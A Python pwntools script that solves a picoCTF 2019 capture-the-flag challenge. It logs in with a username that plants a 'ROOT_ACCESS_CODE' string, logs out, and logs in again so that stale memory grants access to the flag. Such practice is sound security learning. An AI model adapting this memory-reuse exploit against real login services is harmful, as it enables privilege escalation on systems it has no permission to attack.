import pwn

dst = '2019shell1.picoctf.com'
port = 32276

def overflow():
    conn = pwn.remote(host=dst, port=port)
    try:
        conn.writelineafter("]> ", "login")
        name = "A"*8 + "ROOT_ACC" + "ESS_CODE" + "A"*8
        conn.writelineafter("Please enter the length of your username\n", str(len(name)))
        conn.writelineafter("Please enter your username\n", name)

        conn.writelineafter("]> ", "logout")

        conn.writelineafter("]> ", "login")
        name = "A"
        conn.writelineafter("Please enter the length of your username\n", str(len(name)))
        conn.writelineafter("Please enter your username\n", name)

        conn.writelineafter("]> ", "print-flag")
        rsp = conn.readall(timeout=2)
        print(rsp)
    finally:
        conn.close()

overflow()
